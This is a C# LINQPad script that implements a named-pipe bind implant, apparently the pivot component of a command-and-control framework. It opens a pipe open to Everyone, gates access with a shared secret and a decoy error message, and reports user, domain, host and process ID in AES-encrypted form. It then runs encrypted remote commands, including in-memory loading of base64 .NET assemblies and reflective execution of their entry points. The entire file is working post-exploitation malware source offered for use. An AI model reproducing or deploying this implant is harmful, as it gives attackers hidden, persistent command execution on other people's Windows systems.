<Query Kind="Program">
  <Namespace>System.IO.Pipes</Namespace>
  <Namespace>System.Security.AccessControl</Namespace>
  <Namespace>System.IO.Compression</Namespace>
  <Namespace>System.Runtime.InteropServices</Namespace>
</Query>

void Main()
{
"starting".Dump();
PBind.pipeName = "PIPENAME";
PBind.secret = "secret";
PBind.encryption = "jhPtfSwdNCWkks3qcDcj8OYtT/a3QY9VS/3HMX+54RQ=";
PBind.kill = false;
PBind.PbindConnect();
"end".Dump();
}

public class PBind
{
	public static string command;
	public static bool kill;
	public static string pipeName;
	public static string encryption;
	public static string secret;
	public static string output;
	public static bool running;

	public static void PbindConnect()
	{
		PipeSecurity x = new System.IO.Pipes.PipeSecurity();
		var xx = new System.IO.Pipes.PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, AccessControlType.Allow);
		x.AddAccessRule(xx);
		var p = new System.IO.Pipes.NamedPipeServerStream(pipeName, PipeDirection.InOut, 100, PipeTransmissionMode.Byte, PipeOptions.None, 4096, 4096, x);

		try
		{
			p.WaitForConnection();
			running = true;
			var pipeReader = new System.IO.StreamReader(p);
			var pipeWriter = new System.IO.StreamWriter(p);
			pipeWriter.AutoFlush = true;
			var ppass = pipeReader.ReadLine();
			var command = "";
			while (running)
			{
				if (ppass != secret)
				{
					pipeWriter.WriteLine("Microsoft Error: 151337");
				}
				else
				{
					while (running)
					{
						var u = "";
						try
						{
							u = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
						}
						catch
						{
							u = System.Environment.UserName;
						}
						u += "*";
						var dn = System.Environment.UserDomainName;
						var cn = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
						var arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
						int pid = Process.GetCurrentProcess().Id;
						Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
						var o = String.Format("PBind-Connected: {0};{1};{2};{3};{4};", dn, u, cn, arch, pid);
						var zo = Encryption(encryption, o);
						pipeWriter.WriteLine(zo);
						var exitvt = new ManualResetEvent(false);
						var output = new StringBuilder();

						while (running)
						{
							var zz = Encryption(encryption, "COMMAND");
							pipeWriter.WriteLine(zz);
							if (p.CanRead)
							{
								command = pipeReader.ReadLine();
								if (!String.IsNullOrWhiteSpace(command))
								{
									var sOutput2 = new StringWriter();
									Console.SetOut(sOutput2);
									var cmd = Decryption(encryption, command);

									if (cmd.StartsWith("KILL"))
									{
										running = false;
										p.Disconnect();
										p.Close();
										//var zzz = Encryption(encryption, "Kill Received");
										//pipeWriter.WriteLine(zzz);
										//pipeWriter.Flush();
									}
									else if (cmd.ToLower().StartsWith("loadmodule"))
									{
										try
										{
											var module = Regex.Replace(cmd, "loadmodule", "", RegexOptions.IgnoreCase);
											var assembly = System.Reflection.Assembly.Load(System.Convert.FromBase64String(module));
										}
										catch (Exception e) { Console.WriteLine($"Error loading modules {e}"); }
										Console.WriteLine("Module loaded sucessfully");
									}
									else if (cmd.ToLower().StartsWith("run-dll") || cmd.ToLower().StartsWith("run-exe"))
									{
										var resultss = rAsm((cmd));
									}
									else
									{
										var resultss = rAsm($"run-exe Core.Program Core {cmd}");
									}

									output.Append(sOutput2.ToString());
									//output.Append("----END OF COMMAND----");
									var result = Encryption(encryption, output.ToString());

									pipeWriter.Flush();
									pipeWriter.WriteLine(result);
									pipeWriter.Flush();

									output.Clear();
									output.Length = 0;
									sOutput2.Flush();
									sOutput2.Close();
								}
							}
						}
					}
				}
			}
		}
		catch {}
	}

	[DllImport("shell32.dll")] static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);

	static string[] CLArgs(string cl)
	{
		int argc;
		var argv = CommandLineToArgvW(cl, out argc);
		if (argv == IntPtr.Zero)
			throw new System.ComponentModel.Win32Exception();
		try
		{
			var args = new string[argc];
			for (var i = 0; i < args.Length; i++)
			{
				var p = Marshal.ReadIntPtr(argv, i * IntPtr.Size);
				args[i] = Marshal.PtrToStringUni(p);
			}

			return args;
		}
		finally
		{
			Marshal.FreeHGlobal(argv);
		}
	}
	static Type LoadS(string assemblyqNme)
	{
		return Type.GetType(assemblyqNme, (name) =>
		   {
			   return AppDomain.CurrentDomain.GetAssemblies().Where(z => z.FullName == name.FullName).LastOrDefault();
		   }, null, true);
	}
	static string rAsm(string c)
	{
		var splitargs = c.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
		int i = 0;
		string sOut = null;
		bool runexe = true;
		string sMethod = "", sta = "", qNme = "", name = "";
		foreach (var a in splitargs)
		{
			if (i == 1)
				qNme = a;
			if (i == 2)
				name = a;
			if (c.ToLower().StartsWith("run-exe"))
			{
				if (i > 2)
					sta = sta + " " + a;
			}
			else
			{
				if (i == 3)
					sMethod = a;
				else if (i > 3)
					sta = sta + " " + a;
			}
			i++;
		}
		string[] l = CLArgs(sta);
		var asArgs = l.Skip(1).ToArray();
		foreach (var Ass in AppDomain.CurrentDomain.GetAssemblies())
		{
			if (Ass.FullName.ToString().ToLower().StartsWith(name.ToLower()))
			{
				var lTyp = LoadS(qNme + ", " + Ass.FullName);
				try
				{
					if (c.ToLower().StartsWith("run-exe"))
						sOut = lTyp.Assembly.EntryPoint.Invoke(null, new object[] { asArgs }).ToString();
					else
					{
						try
						{
							sOut = lTyp.Assembly.GetType(qNme).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, asArgs).ToString();
						}
						catch
						{
							sOut = lTyp.Assembly.GetType(qNme).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, null).ToString();
						}
					}
				}
				catch { }
				break;
			}
		}
		return sOut;
	}
	static string Decryption(string key, string enc)
	{
		var b = System.Convert.FromBase64String(enc);
		var IV = new Byte[16];
		Array.Copy(b, IV, 16);
		try
		{
			var a = CreateCam(key, System.Convert.ToBase64String(IV));
			var u = a.CreateDecryptor().TransformFinalBlock(b, 16, b.Length - 16);
			return System.Text.Encoding.UTF8.GetString(u.Where(x => x > 0).ToArray());
		}
		catch
		{
			var a = CreateCam(key, System.Convert.ToBase64String(IV), false);
			var u = a.CreateDecryptor().TransformFinalBlock(b, 16, b.Length - 16);
			return System.Text.Encoding.UTF8.GetString(u.Where(x => x > 0).ToArray());
		}
		finally
		{
			Array.Clear(b, 0, b.Length);
			Array.Clear(IV, 0, 16);
		}
	}

	public static class atest
	{
		public static bool check(byte a)
		{
			return a > 0;
		}

	}

	static bool IsHighIntegrity()
	{
		System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();
		System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);
		return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
	}

	static string Encryption(string key, string un, bool comp = false, byte[] unByte = null)
	{
		byte[] byEnc = null;
		if (unByte != null)
			byEnc = unByte;
		else
			byEnc = System.Text.Encoding.UTF8.GetBytes(un);

		if (comp)
			byEnc = Compress(byEnc);

		try
		{
			var a = CreateCam(key, null);
			var f = a.CreateEncryptor().TransformFinalBlock(byEnc, 0, byEnc.Length);
			return System.Convert.ToBase64String(Combine(a.IV, f));
		}
		catch
		{
			var a = CreateCam(key, null, false);
			var f = a.CreateEncryptor().TransformFinalBlock(byEnc, 0, byEnc.Length);
			return System.Convert.ToBase64String(Combine(a.IV, f));
		}
	}

	static System.Security.Cryptography.SymmetricAlgorithm CreateCam(string key, string IV, bool rij = true)
	{
		System.Security.Cryptography.SymmetricAlgorithm a = null;
		if (rij)
			a = new System.Security.Cryptography.RijndaelManaged();
		else
			a = new System.Security.Cryptography.AesCryptoServiceProvider();

		a.Mode = System.Security.Cryptography.CipherMode.CBC;
		a.Padding = System.Security.Cryptography.PaddingMode.Zeros;
		a.BlockSize = 128;
		a.KeySize = 256;

		if (null != IV)
			a.IV = System.Convert.FromBase64String(IV);
		else
			a.GenerateIV();

		if (null != key)
			a.Key = System.Convert.FromBase64String(key);

		return a;
	}
	static byte[] Compress(byte[] raw)
	{
		using (MemoryStream memory = new MemoryStream())
		{
			using (GZipStream gzip = new GZipStream(memory, CompressionMode.Compress, true))
			{
				gzip.Write(raw, 0, raw.Length);
			}
			return memory.ToArray();
		}
	}
	static byte[] Combine(byte[] first, byte[] second)
	{
		byte[] ret = new byte[first.Length + second.Length];
		Buffer.BlockCopy(first, 0, ret, 0, first.Length);
		Buffer.BlockCopy(second, 0, ret, first.Length, second.Length);
		return ret;
	}
}